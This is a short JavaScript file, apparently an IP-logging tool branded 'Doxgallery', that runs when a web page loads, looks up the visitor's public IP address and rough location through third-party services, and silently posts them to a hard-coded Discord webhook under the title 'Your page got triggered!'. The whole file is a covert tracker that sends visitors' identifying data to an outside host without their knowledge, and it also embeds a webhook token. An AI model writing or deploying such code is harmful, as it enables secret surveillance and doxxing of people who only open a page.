async function sendIPToDiscord(ipAddress, location, device) {
    const webhookURL = "https://discord.com/api/webhooks/1154036477781622815/XX-5Q903G7Cf04JYYjuLZMhaBiTT8Lk35OKznpTk9k-5d0KXq7g7YDe5pLzhe4dJu1_J";

    const embedData = {
        color: 16711680, // #b43434 in decimal
        author: {
            name: "Doxgallery",
            icon_url: "https://avatars.githubusercontent.com/u/145360679?s=400&u=65f0ed7b745ddb0ba118859f135281c62ad0eb38&v=4",
        },
        title: "Your page got triggered!",
        description: `**IP V4 Address:**\n> ${ipAddress}\n**Location:**\n> ${location}\n**Device:**\n> ${device}`,
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ embeds: [embedData] }),
        });

        if (!response.ok) {
            console.error("Error sending data to Discord:", response.status);
        }
    } catch (error) {
        console.error("Error sending data to Discord:", error);
    }
}

async function getLocationFromIP(ipAddress) {
    try {
        const response = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const data = await response.json();
        return data.city ? `${data.country_name}, ${data.city}` : data.country_name;
    } catch (error) {
        console.error("Error fetching location data:", error);
        return "Unknown";
    }
}

function getDeviceInfo() {
    return "Desktop";
}

window.addEventListener("load", async () => {
    try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        const ipAddress = data.ip;

        const location = await getLocationFromIP(ipAddress);
        const device = getDeviceInfo();

        sendIPToDiscord(ipAddress, location, device);
    } catch (error) {
        console.error("Error fetching IP address:", error);
    }
});
